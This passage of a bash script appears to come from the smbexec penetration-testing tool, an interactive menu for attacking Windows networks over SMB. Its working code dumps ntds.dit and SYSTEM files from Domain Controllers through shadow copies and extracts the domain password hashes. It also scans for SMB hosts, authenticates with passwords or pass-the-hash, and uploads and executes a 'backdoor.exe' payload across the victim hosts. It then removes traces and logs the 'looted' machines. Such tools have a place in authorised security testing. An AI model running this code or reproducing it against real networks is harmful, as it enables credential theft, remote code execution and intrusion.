	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$tf/"$sharedrive" -c "get $temppath\\ntds.dit $logfldr/hashes/DC/ntds.dit" &> /dev/null
	$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$tf/"$sharedrive" -c "get $temppath\\sys $logfldr/hashes/DC/sys" &> /dev/null
	
	if [ ! -e $logfldr/hashes/DC/ntds.dit ] && [ ! -e $logfldr/hashes/DC/sys ]; then
		echo -e "\t\e[1;31m[!] Could not grab ntds.dit & sys files from the Domain Controller...\e[0m"
		sleep 5
		f_freshstart
		f_mainmenu
	else
		echo -e "\t\e[1;32m[+] We have ntds.dit & sys files...let's get some hashes\e[0m"
		sleep 3
	fi
	#cleanup the host
	echo -e "\n\e[1;33m[*]Attempting to remove the files created from the Domain Controller...\e[0m"
	$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C DEL $tempdrive$temppath\sys && DEL $tempdrive$temppath\ntds.dit" &> /dev/null
	echo -e "\n\e[1;33m[*]Attempting to remove the shadow copy created from the Domain Controller...\e[0m"
	$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$tf "CMD /C vssadmin Delete Shadows /Shadow=$vscid /quiet" &> /dev/null
done

f_esedbexport
f_dsusers
f_freshstart
f_mainmenu

}

f_finddcs(){
if [ "$SMBDomain" != "." ]; then
	x="com net org local"
	for i in $x; do
		dig SRV _ldap._tcp.pdc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
		dig SRV _ldap._tcp.dc._msdcs.$SMBDomain.$i |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
	done

	if [ -s /tmp/smbexec/pdc.txt ]; then
		echo -e "\nPrimary Domain Controller\n========================="
		cat /tmp/smbexec/pdc.txt
	fi

	if [ -s /tmp/smbexec/dcs.txt ]; then
		echo -e "\nAll Domain Controllers\n======================"
		cat /tmp/smbexec/dcs.txt
		echo
	fi
fi
}

f_esedbexport(){
echo -e "\n\e[1;33m[*]Extracting data and link tables from the ntds.dit file...\e[0m"
sleep 2
eseexportpath=$(locate -l 1 -b "\esedbexport"| sed 's,/*[^/]\+/*$,,')
$eseexportpath/esedbexport -l /tmp/smbexec/esedbexport.log -t /tmp/smbexec/ntds.dit $logfldr/hashes/DC/ntds.dit
datatable=$(ls /tmp/smbexec/ntds.dit.export/ | grep datatable)
linktable=$(ls /tmp/smbexec/ntds.dit.export/ | grep link_table)
}

f_dsusers(){
echo -e "\n\e[1;33m[*]Extracting hashes, please standby...\e[0m"
sleep 2
dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys > $logfldr/hashes/DC/ntds.output
$smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/$SMBDomain-dc-hashes.lst

set -f              # turn off globbing
IFS='
'	# split at newlines only
for i in $(cat $logfldr/hashes/DC/$SMBDomain-dc-hashes.lst); do
	dc_username=$(echo "$i" |cut -d ":" -f1)
	dc_hashvalue=$(echo "$i" |cut -d ":" -f3-4)
	echo -e $dc_username'\t'$dc_hashvalue >> /tmp/smbexec/hash_pass_lst.tmp
done
unset IFS
set +f	# turn off globbing

#Remove accounts with empty passwords
cat /tmp/smbexec/hash_pass_lst.tmp |grep -v "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" > $logfldr/hashes/DC/cred.lst

if [ -s $logfldr/hashes/DC/$SMBDomain-dc-hashes.lst ]; then
	echo -e "\n\e[1;32m[+] Success, looks like we got what we came for...\e[0m"
	sleep 5
else
	echo -e "\n\e[1;31m[!] The file is empty, looks like something didn't work right...\e[0m"
	sleep 5
	f_freshstart
	f_mainmenu
fi

}

#Function to build host list
f_hosts(){
	f_banner

	range=
	while [ -z "$range" ]; do read -p " Enter your target network range (nmap format) : " range; f_validaterange; done

	echo -e "\n\e[1;33mPerforming an nmap scan to identify live devices with ports 139 & 445 open.\n\n\t -This may take a bit.-\e[0m"

	nmap -sS -P0 -n -p139,445 --open "$range" -oG $logfldr/host.gnmap &> /dev/null
	cat $logfldr/host.gnmap | awk '{print $2}'|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u > $logfldr/host.lst.$(echo $range | cut -d"/" -f1)

	if [ -s $logfldr/host.lst.$(echo $range | cut -d"/" -f1) ]; then
		echo -e "\n\e[1;33mHosts found:\e[0m"
		cat $logfldr/host.lst.$(echo $range | cut -d"/" -f1)
		rm $logfldr/host.gnmap
		echo -en "\n\e[1;33mYour host file is located at $logfldr/host.lst.$(echo $range | cut -d"/" -f1)\n\n\tHit Enter to Return to Main Menu.\e[0m"
		read -p " "
	else
		echo -en "\n\e[1;33mI'm sorry but no hosts were identified with port 139 or 445 open.\e[0m"
		rm $logfldr/host.gnmap
		rm $logfldr/host.lst.$(echo $range | cut -d"/" -f1)
	fi
	f_freshstart
	f_mainmenu
}

f_validaterange(){
    # added nmap format validation - use of subnets (ex. 192.168.0.0/24), stars (ex. 192.168.*.*), and split ranges (ex. 192.168.1.1-10,14) now accepted.
    if [ -z $(echo "$range" | grep -E '^((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]{1}){1}){0,}|\*)\.(((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}){0,}|\*)\.){2}((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}){0,}|\*|([0]{1}\/(8|9|[1-2]{1}[0-9]{1}|30|31|32){1})){1}$' | grep -v -E '([-][0-9]{1,3}[-])|(([,-].*[/]|[/].*[,-])|([*].*[/]|[/].*[*]))') ]; then
        range=
    else
        range=$(echo ${range})
    fi
}

#Function to emuerate shares - thx c0ncealed, great idea!
f_enumshares(){

	f_banner

	p=
	if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
	read -e -p " Target IP or host list $p: " tf
	if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

	if [[ $tf =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		echo $tf > /tmp/smbexec/sharerhost.txt
		SHARERHOSTS=/tmp/smbexec/sharerhost.txt
	elif [[ -e $tf ]]; then 
		SHARERHOSTS=$tf
	elif [[ -z $tf ]]; then 
		f_enumshares
	else
		echo -en "\n Invalid IP or file does not exist.\n\n Hit enter to return to Main Menu."
		read -p " "
		f_mainmenu
	fi

	# Call the smbauth functions
	f_smbauth

	touch /tmp/smbexec/enum.shares
	for i in $(cat "$SHARERHOSTS"); do
		echo -e "\n***************" | tee -a /tmp/smbexec/enum.shares
		echo $i | tee -a /tmp/smbexec/enum.shares
		echo "***************" | tee -a /tmp/smbexec/enum.shares

		#not at all sure why $smbexecpath/smbexeclient wants to run the folder...
		cd $smbexecpath
		./smbexeclient -L $i -A /tmp/smbexec/smbexec.auth >& /tmp/smbexec/connects.tmp
		cd - &> /dev/null
	
		f_smbauthinfo
		#What we are going to show the user
		if [ ! -z "$logonfail" ]; then
			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m" | tee -a /tmp/smbexec/enum.shares
		elif [ ! -z "$connrefused" ]; then
			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m" | tee -a /tmp/smbexec/enum.shares
		elif [ ! -z "$unreachable" ]; then
			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m" | tee -a /tmp/smbexec/enum.shares
		elif [ ! -z "$accessdenied" ]; then
			echo -e "\e[1;31m[-] Remote access to $i was denied\e[0m" | tee -a /tmp/smbexec/enum.shares
		else
			cat /tmp/smbexec/connects.tmp | awk '/Sharename/,/failed/'| egrep -v 'session|lame'| tee -a /tmp/smbexec/enum.shares
		fi
	done

	# Move the file
	mv /tmp/smbexec/enum.shares $logfldr/$SMBUser.host.shares.$DATE

	# We'll provide a statistical analysis of the shares file if it's there...
	if [ -z $(cat $logfldr/*.host.shares.* | grep 'No such file' )  ]; then
		echo -e "\nTop 10 shares in enum file: \n\n    count\tshare\n ----------------------"
		cat $logfldr/*.host.shares.*| grep -E 'Disk' | cut -d" " -f1 | sed -e 's/^ *//' | sort | uniq -c | sort -nr | head -10
	fi

	echo -e "\n\e[1;33mThe list of host shares can be found at $logfldr/$SMBUser.host.shares.$DATE\e[0m\n\n  \e[1;33mHit enter to return to Main Menu.\e[0m"
	read -p " "

	f_freshstart
	f_mainmenu
}

f_smbauth(){
	SMBUser= #Since the prog is a loop make sure we clear this out
	while [ -z $SMBUser ]; do read -r -e -p " Please provide the username to authenticate as : " SMBUser; done
	
	SMBPass= #Since the prog is a loop make sure we clear this out
	#If the password is blank then we'll use the has value, otherwise smbwinexe & smbexeclient will request the password from the user	
	read -e -p " Please provide the password or hash (<LM>:<NTLM>) [BLANK] : " SMBPass

	if [ -z $SMBPass ]; then
		SMBPass="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
	fi

	# Hashes are 65 characters long, this compares input to see if its a password or a hash
	unset SMBHASH #Since the prog is a loop make sure we clear this out
	if [ "$(echo $SMBPass| wc -m)" -ge "65" ]; then
		export SMBHASH=$SMBPass # This is required when using a hash value
	fi

	# If a domain account is being used, ask for the domain name if not included in SMBUser 
	if [[ -n $(echo $SMBUser | awk -F\\ '{printf("%s", $2)}') ]]; then
		SMBDomain=$(echo $SMBUser | awk -F\\ '{print $1}')
		SMBUser=$(echo $SMBUser | awk -F\\ '{print $2}')
	else
		read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
		if [ -z $SMBDomain ]; then SMBDomain=.;	fi #equivalent to localhost, thx Mubix!
	fi

	echo "username=$SMBUser" > /tmp/smbexec/smbexec.auth
	echo "password=$SMBPass" >> /tmp/smbexec/smbexec.auth
	echo "domain=$SMBDomain" >> /tmp/smbexec/smbexec.auth
}

f_smbauthinfo(){
	cat /tmp/smbexec/connects.tmp | grep "//$i" > /tmp/smbexec/success.chk
	logonfail=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_LOGON_FAILURE")
	connrefused=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_CONNECTION_REFUSED")
	badshare=$(cat /tmp/smbexec/connects.tmp | grep -E 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
	unreachable=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_HOST_UNREACHABLE")
	accessdenied=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_ACCESS_DENIED")
}

f_smbauthresponse(){
		if [ -s /tmp/smbexec/success.chk ] && [ ! -z "$badshare" ]; then
			echo -e "\e[1;33m[*] Authentication to $i was successful, but the share doesn't exist\e[0m"
		elif [ ! -z "$logonfail" ]; then
			echo -e "\e[1;31m[-] Authentication to $i failed\e[0m"
		elif [ ! -z "$accessdenied" ]; then
			echo -e "\e[1;31m[-] Remote access to $i is denied\e[0m"
		elif [ ! -z "$connrefused" ]; then
			echo -e "\e[1;31m[-] Connection to $i was refused\e[0m"
		elif [ ! -z "$unreachable" ]; then
			echo -e "\e[1;31m[-] There is no host assigned to IP address $i \e[0m"
		elif [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
			echo -e "\e[1;32m[+] Authentication to $i successful...\e[0m"
			uploadpayload=1
		else
			echo -e "\e[1;33m[*] I'm not sure what happened on $i, supplying output...\e[0m"
			cat /tmp/smbexec/connects.tmp | egrep 'Error:|failed:'
		fi	

}

#Function to gain the basic info
f_getinfo(){
	clear
	f_banner

	echo -e "\e[1;33mLet's get some info to finalize the attack...\e[0m"

	if [ -z "$LPATH" ]; then LPATH=$logfldr/backdoor.exe; fi
    
	read -p " Please enter the name of a writable share on the victim. [C$] : " SMBShare
	if [ -z "$SMBShare" ]; then SMBShare="C$"; fi

	# Check to see if the admin share is being used
	 if [ "$SMBShare" == "ADMIN$" ]; then
		isadmin=1
		prepath="\\Windows" # Need to add a prepath for the smbwinexe command to work properly
	 fi

	# Check for a share with $ that is not C$
	share=$(echo $SMBShare | grep '\$' | grep -v 'ADMIN\$')
	 if [ ! -z "$share" ] && [ "$share" != "C$" ]; then
	   sharecheck=$(echo $share | cut -d "$" -f1) # Trim the $ off for the winexe share value
	   oddshare="$sharecheck:"
	 fi

	# Check for a 1 letter share without a $
	onelettershare=$(echo $SMBShare | egrep -i '\<[e-z]\>')
	 if [ ! -z "$onelettershare" ]; then
	  SMBShare="$onelettershare"
	  oddshare="$SMBShare:"
	 fi

	echo " Please provide the path to place the exe on the remote host."
	echo -n " Hit enter to place in root of share or enter path (ex: \\\\Temp): "
	read -p "" RPATH
	sharecheck=$(echo $SMBShare | cut -d "$" -f1)
	 if [ -z "$RPATH" ] && [ -z "$isadmin" ] && [ -z "$oddshare" ]; then
	   superoddshare=1
	 fi
	 if [ -z "$RPATH" ] && [ "$SMBShare" == "C$" ]; then
	   cemptyrpath=1
	 fi

	f_smbauth	
	
	p=
	if [[ -e "$logfldr/host.lst.$(echo $range | cut -d"/" -f1)" ]]; then p="[$logfldr/host.lst.$(echo $range | cut -d"/" -f1)]"; fi
	read -e -p " Target IP or host list $p: " tf
	if [ -z $tf ]; then tf="$logfldr/host.lst.$(echo $range | cut -d"/" -f1)"; fi

	if [[ $tf =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		echo $tf > /tmp/smbexec/rhost.txt
		RHOSTS=/tmp/smbexec/rhost.txt
	elif [[ -e $tf ]]; then 
		RHOSTS=$tf
	else
		echo -en "   Invalid IP or file does not exist.\n"
		f_insideprompt
	fi
	f_getsome
}
f_sd(){
xdg-open http://www.youtube.com/watch?v=D7sUh-DX7I0 >& /tmp/mlmjunk
f_mainmenu
}

# The name says it all...get your popcorn ready...
f_getsome(){
	cat /dev/urandom| tr -dc '0-9a-zA-Z'|head -c 8 > /tmp/smbexec/filename.rnd #create a random filename
	SMBFilename=$(cat /tmp/smbexec/filename.rnd).exe #set value for random filename

	echo -e "\n\e[1;33mDuck and Cover...Possible Falling Shells Ahead\e[0m\n"
	
	#prevents rage-quit while remote processes are in play
	dirty=1
	
	for i in $(cat "$RHOSTS"); do
		# Force display output to a file. showconnect provides us an IP for the cleanup function

		$smbexecpath/smbexeclient //$i/$SMBShare -A /tmp/smbexec/smbexec.auth -c "put $LPATH $RPATH\\$SMBFilename ; showconnect" >& /tmp/smbexec/connects.tmp 

		# Check to see what type of error we got so we can tell the user
		f_smbauthinfo
		f_smbauthresponse
		
		if [ "$uploadpayload" == 1 ];then
			echo -e "\t\e[1;32m[+] Uploading and attempting to execute payload...\e[0m"
		fi
		
		# Get successful IP addy for cleanup later
		ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u) 

		# If no successful connection was made above this portion is skipped
		if [ -s /tmp/smbexec/success.chk ] && [ -z "$badshare" ]; then
			echo $ConnCheck >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
			if [ "$isadmin" == "1" ]; then
				ADMINPATH=$prepath$RPATH
				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			fi

			if [ ! -z $cemptyrpath ]; then
				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C C:\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			fi

			if [ ! -z "$oddshare" ]; then
				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			elif [ ! -z "$superoddshare" ]; then
				#Ugly hack for placing payload in root of shares like Users or Public. May only work for shares on the C drive
				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C \\$SMBShare\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			else
				$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "cmd /C $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk &
			fi

			echo $! >> /tmp/smbexec/winexe.pid #grab the pid so we can kill it
		fi

		#Unset the variables because we're in a for-loop
		unset logonfail
		unset connrefused
		unset badshare
		unset unreachable
	done
	
	if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
		echo -e "\n\e[1;33mReady for cleanup!  Hit enter when the shells stop rolling in...\e[0m"
		read
	fi
	f_cleanup
}

f_cleanup(){
	# Cleaning up the victims - killing exploit procs & removing the exe file
	# Only those with successful logins will be hit again

	if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
		cat /tmp/smbexec/hosts.loot.tmp | sed '/^$/d'| sort -u > /tmp/smbexec/hosts.loot
		RHOSTS=/tmp/smbexec/hosts.loot
	fi
	if [ -s /tmp/smbexec/hosts.loot ]; then
		echo -e "\n\e[1;33mGo play with your shells I've gotta clean up the mess you made...\e[0m"

		for i in $(cat $RHOSTS); do
			echo
			echo "***************"
			echo $i
			echo "***************"
			echo -e "\e[1;33mKilling the file process on the victim, please standby\e[0m"
			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "cmd /C taskkill /IM $SMBFilename /F" &> /tmp/smbexec/error.jnk
			echo -e "\n\e[1;33mRemoving the file from the victim, please standby\e[0m"
			if [ ! -z $cemptyrpath ]; then
				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL C:\\$SMBFilename" &> /tmp/smbexec/error.jnk
			elif [ "$isadmin" == "1" ]; then
				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $ADMINPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
			elif [ ! -z "$oddshare" ]; then
				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C $oddshare && DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
			elif [ ! -z "$superoddshare" ]; then
				#Ugly hack for removing payload in root of shares like Users or Public. May only work for shares on the C drive
				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C cd $SMBShare && DEL \\$SMBFilename" &> /tmp/smbexec/error.jnk
			else
				$smbexecpath/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //$i "cmd /C DEL $RPATH\\$SMBFilename" &> /tmp/smbexec/error.jnk
			fi
		done
	else
		echo -e "\n\e[1;33mSorry, no shells. Maybe next time...\e[0m\n\n"
	fi
	
	#prevents rage-quit while remote processes are in play
	if [ $dirty -eq 1 ];then
		dirty=
	fi
    
	# Create a list of ips we successfully exploited unless none were exploited
	if [ -s /tmp/smbexec/hosts.loot ]; then
		mv /tmp/smbexec/hosts.loot $logfldr/$SMBUser.hosts.looted.$DATE
		echo -e "\n\e[1;33mThe list of hosts successfully exploited can be found at $logfldr/$SMBUser.hosts.looted.$DATE\e[0m\n\n"
	fi
	
	echo -en "\e[1;33mHit enter to return to Main Menu\e[0m "
	read -p ""
	
	if [ -e /tmp/smbexec/winexe/pid ]; then
		for i in $(cat /tmp/smbexec/winexe.pid); do
			kill -9 $(cat /tmp/smbexec/winexe.pid) #Kill off the winexe pid because it doesn't seem to exit gracefully
			wait $(cat /tmp/smbexec/winexe.pid) 2>/dev/null #Prevents output from pid kill to be written to screen
		done
	fi

	f_freshstart
	f_mainmenu
}

f_freshstart(){

 rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir

# unset variables to prevent problems in the loop
vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da sysenumchoice sysexpchoice"

for var in $vars; do
	unset $var
done

}

f_system_enumeration_menu(){
	clear
	f_banner
	echo -e "\e[1;37mSystem Enumeration Menu\e[0m"
	echo "1. Create a host list"
	echo "2. Enumerate Shares"
	echo "3. Remote login validation"
	echo "4. Check systems for Domain Admin"
	echo "5. Check systems for UAC"
	echo "6. Main menu"

	read -p "Choice : " sysenumchoice

	case "$sysenumchoice" in
		1) f_hosts ;;
		2) f_enumshares ;;
		3) f_smb_login ;;
		4) f_da_sys_check ;;
		5) f_uac_setup ;;
		6) f_mainmenu ;;
		*) f_system_enumeration_menu ;;
	esac

}

f_system_exploitation_menu(){
	clear
	f_banner
	
	echo -e "\e[1;37mSystem Exploitation Menu\e[0m"
	echo "1. Remote system access"
	echo "2. Create an executable and rc script"
	echo "3. Disable UAC"
	echo "4. Enable UAC"
	echo "5. Main Menu"

	read -p "Choice : " sysexpchoice

	case "$sysexpchoice" in
		1) f_vanish ;;
		2) f_vanish ;;
		3) f_uac_setup ;;
		4) f_uac_setup ;;
		5) f_mainmenu ;;
		*) f_system_exploitation_menu ;;
	esac

}

f_obtain_hashes_menu(){
	clear
	f_banner
	echo -e "\e[1;37mObtain Hashes Menu\e[0m"
	echo "1. Workstation & Server Hashes"
	echo "2. Domain Controller"
	echo "3. Main Menu"

	read -p "Choice : " hashchoice

	case "$hashchoice" in
		1) f_hashgrab ;;
		2) f_dchashgrab ;;
		3) f_mainmenu ;;
		*) f_obtain_hashes_menu ;;
	esac

}

f_mainmenu(){
	if [ ! -d /tmp/smbexec/ ]; then mkdir /tmp/smbexec/; fi
	DATE=$(date +"%H%M")
	clear
	f_banner
	echo -e "\e[1;37mMain Menu\e[0m"
	echo "1. System Enumeration"
	echo "2. System Exploitation"
	echo "3. Obtain Hashes"
	echo "4. Exit"

	read -p "Choice : " mainchoice

	case "$mainchoice" in
		1) f_system_enumeration_menu;;
		2) f_system_exploitation_menu;;
		3) f_obtain_hashes_menu;;
		4) if [[ -z $(ls $logfldr) ]];then rm -rf $logfldr; fi
		   clear;f_freshstart;exit;;
		1983) f_sd;;
		*) f_mainmenu
	esac
}
# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
	exit 1
else
	f_mainmenu
fi
